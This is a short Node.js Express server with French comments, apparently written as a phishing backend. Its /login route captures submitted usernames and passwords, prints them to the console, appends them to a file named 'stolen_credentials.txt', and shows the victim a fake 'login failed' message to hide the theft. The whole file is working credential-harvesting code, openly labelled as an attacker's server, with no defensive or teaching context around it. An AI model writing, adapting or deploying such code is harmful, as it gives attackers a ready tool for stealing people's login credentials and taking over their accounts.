const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = 4000;

// Middleware pour traiter les données POST
app.use(bodyParser.urlencoded({ extended: false }));

// Route pour capturer les informations d'identification
app.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    // Affiche les informations d'identification dans la console
    console.log(`Nom d'utilisateur: ${username}`);
    console.log(`Mot de passe: ${password}`);

    // Enregistre les informations dans un fichier texte
    const data = `Nom d'utilisateur: ${username}, Mot de passe: ${password}\n`;
    fs.appendFileSync(path.join(__dirname, 'stolen_credentials.txt'), data);

    // Redirige la victime vers une page de confirmation
    res.send('<h1>Connexion échouée</h1><p>Veuillez vérifier vos informations et réessayer.</p>');
});

// Lancement du serveur sur le port 4000
app.listen(port, () => {
    console.log(`Serveur attaquant en écoute sur http://localhost:${port}`);
});
